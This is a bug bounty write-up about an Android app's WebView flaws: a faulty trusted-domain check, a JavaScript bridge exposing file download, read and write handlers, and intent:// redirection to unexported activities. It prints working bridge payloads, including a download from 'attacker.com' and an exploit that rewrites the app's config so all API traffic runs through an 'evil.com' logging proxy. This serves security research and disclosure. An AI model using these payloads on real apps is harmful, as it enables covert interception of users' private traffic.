---
title: "From a Failed RCE Attempt to Full Remote Traffic Interception"
date: "2026-06-26"
category: "Mobile Security"
tags: ["Android", "WebView", "WriteUp"]
excerpt: "how a failed RCE attempt evolved into a remote spying capability, allowing sensitive application data to be intercepted through WebView abuse, JavaScript bridge access"
thumbnail: "/assets/thumbnail/exfill-data.webp"
---
## Intro

A few days ago, I was testing an application in a private program on HackerOne. The target exposed a large attack surface, including deep links, WebViews, JavaScript bridges, and multiple exported activities. From experience, these components often introduce trust-boundary issues, so I started by reviewing how deep link and IPC-related content was handled within the application.

During the analysis, I identified a WebView host validation bypass. I spent the next few days focusing on escalating the issue, aiming for remote code execution. In the end, I was not able to reach RCE, but I did manage to achieve a remote interception and spying capability instead.

## The Trust Boundary

The application exposed a deep-link parameter named `appurl` that allowed web content to be loaded inside an in-app WebView. Before loading a URL inside webview, the application attempted to verify that the destination belonged to a trusted domain.

The validation logic was implemented in:

```java
com.vendor.app.ui.proxy.a
```

Specifically:

```java
public static final boolean a(String url)
```

The relevant code looked like this:

```java
String DOMAIN = k.e;

if (!host.endsWith(DOMAIN)) {

    if (!DOMAIN.endsWith(host)) {

        return false;
    }
}

return true;
```

At first if statement this appears to be a normal domain validation routine. However, the second condition introduces a subtle but critical flaw.

Consider the following values:

```text
host = get.co.id
DOMAIN = .target.co.id
```

The following expression evaluates to true:

```java
".target.co.id".endsWith("get.co.id")
```

As a result, an attacker-controlled domain such as:

```text
https://get.co.id
```

is incorrectly classified as trusted.

im using frida to confirm Runtime verification:

```text
a.a is called: url=https://get.co.id/payload.html
a.a result=true
```

The application should have rejected the URL.Instead, it accepted it.

## Loading Arbitrary Content Inside a Trusted WebView

With the validation bypass identified, the next step was straightforward.

The application exposed the following deep link:

```bash
app://main?appurl=https://get.co.id/payload.html
```

Opening the link caused the application to load attacker-controlled HTML directly into a privileged WebView.

## Access to Native Functionality
The WebView exposed a JavaScript bridge that allowed web content to communicate directly with native Android code.

A typical bridge invocation looked like this:

```javascript
jsbridge.sendMsg(
  JSON.stringify({
    handlerName: "<handlerName>",
    data: {
      key: "value"
    },
    callbackId: "cb_1"
  })
);
```

After digging through the decompiled Android code, I noticed three handlers that immediately caught my attention:

1. `FileDownload`
2. `readFile`
3. `writeFile`

### FileDownload Handler

My initial focus was on the `FileDownload` handler. It accepted a URL parameter and downloaded the specified file from the internet:

```javascript
jsbridge.sendMsg(
  JSON.stringify({
    handlerName: "FileDownload",
    data: {
      url: "https://attacker.com/evil.so"
    },
    callbackId: "cb_1"
  })
);
```

Unfortunately, the downloaded file was always stored in `/sdcard/Download/`, and I could not find a way to escape or control the destination path.

```java
try {
    Uri uri = Uri.parse(aVar.d());
    String strB = aVar.b() != null ? aVar.b() : uri.getLastPathSegment();
    ((DownloadManager) context.getSystemService("download")).enqueue(
        new DownloadManager.Request(uri)
            .setTitle(aVar.c() != null ? aVar.c() : strB)
            .addRequestHeader(HttpHeaders.COOKIE,
                CookieManager.getInstance().getCookie(aVar.d()))
            .setDescription(aVar.a())
            .setNotificationVisibility(1)
            .setDestinationInExternalPublicDir(
                Environment.DIRECTORY_DOWNLOADS, strB
            )
    );
    e(interfaceC0272b, c, "");
} catch (IllegalArgumentException e2) {}
```

### readFile Handler

The `readFile` handler was essentially an arbitrary file read primitive, allowing JavaScript to read any file accessible to the application.

While this was certainly impactful, it was not sufficient for the level of compromise I was aiming for.

```java
BufferedReader bufferedReader =
    (BufferedReader) C6282b.this.f11660b.get(this.f11675b);
char[] cArr = new char[this.f11676c];

if (bufferedReader == null) {
    EnumC6285c enumC6285c2 = EnumC6285c.ERROR_BUFFER_NULL;
    this.f11677d.mo10928a(
        enumC6285c2.getErrorCode(),
        enumC6285c2.getErrorMessage()
    );
} else {
    if (bufferedReader.read(cArr) == -1) {
        EnumC6285c enumC6285c3 =
            EnumC6285c.ERROR_READ_BUFFER_LIMIT;
        this.f11677d.mo10928a(
            enumC6285c3.getErrorCode(),
            enumC6285c3.getErrorMessage()
        );
    }
    this.f11677d.mo10929b(new String(cArr));
}
```

### writeFile Handler

The `writeFile` handler turned out to be far more interesting. It could be invoked as follows:

```javascript
jsbridge.sendMsg(
  JSON.stringify({
    handlerName: "writeFile",
    data: {
      id: "/data/data/com.vendor.app/shared_prefs/test.txt",
      data: "hello"
    },
    callbackId: "cb_1"
  })
);
```

Initially, I attempted to write binary payloads to disk. However, this approach quickly failed. The bridge used Gson to deserialize incoming data, and during the conversion process, null bytes were stripped, making it impossible to reliably write binary files.

At that point, I changed my approach.

Instead of trying to drop a native library or executable, I began exploring configuration files under the application's private directory. Eventually, while inspecting `/data/data/com.vendor.app/shared_prefs/app_config.xml`, I noticed the following entry:

```xml
...
<host_api>https://api.target.com/api</host_api>
...
```

This value was used as the base URL for virtually every API request performed by the application through OkHttp:

```text
{host_api}/endpoint
```

Seeing this immediately sparked an idea.

I created a proxy server at `evil.com` that logged every incoming request and response before transparently forwarding traffic to the legitimate backend at `https://api.target.com/api`.

The final exploit simply replaced the original API endpoint:

```javascript
jsbridge.sendMsg(
  JSON.stringify({
    handlerName: "writeFile",
    data: {
      id: "/data/data/com.vendor.app/shared_prefs/app_config.xml",
      data: "...<host_api>https://evil.com/api</host_api>..."
    },
    callbackId: "cb_1"
  })
);
```

The modification was not applied immediately. The victim had to completely close and reopen the application before the new configuration was loaded.

Once restarted, however, the application began sending all API traffic through the attacker-controlled server, effectively granting the attacker the ability to remotely intercept and monitor every API request made by the victim.

## Additional Bug

While continuing the investigation, I discovered that attacker-controlled web content could also trigger Intent redirection through the WebView's `shouldOverrideUrlLoading()` implementation.

Specifically, the WebView allowed navigation to URLs using the following scheme:

```text
intent://
```

These URLs were automatically parsed and passed directly to the application's deep-link handling logic.

The relevant sink looked like this:

```java
Intent uri2 = Intent.parseUri(str, Intent.URI_INTENT_SCHEME);

if (
    context.getPackageManager()
        .resolveActivity(uri2, 65536)
    != null
) {
    context.startActivity(uri2);
}
```

Critically, no validation was performed on attacker-controlled Intent attributes such as:

```text
component=
package=
class=
```

embedded within the `intent://` URI.

As a result, arbitrary web content loaded inside the vulnerable WebView could construct and trigger fully attacker-controlled Intents.

Even more interestingly, because the application invoked `startActivity()` using its own application context, it was possible to launch arbitrary activities within the target application itself, including activities that were not exported and therefore normally inaccessible to external applications.

In practice, an attacker simply needed to redirect the WebView to a crafted `intent://` URL to gain access to internal application components that were never intended to be reachable from untrusted content.


## Conclusion

Sometimes, you don't get exactly what you want in life. However, hard work and commitment will always bring you closer to your goals.

Nevertheless, the countless hours spent analyzing the application, understanding its internals, and experimenting with different attack paths ultimately led to a powerful remote interception and spying capability.

Research does not always end where you expect. Often, persistence and curiosity lead you somewhere equally interesting. Even when you do not reach your original objective, every dead end, failed attempt, and late-night debugging session brings you one step closer to becoming a better hacker.
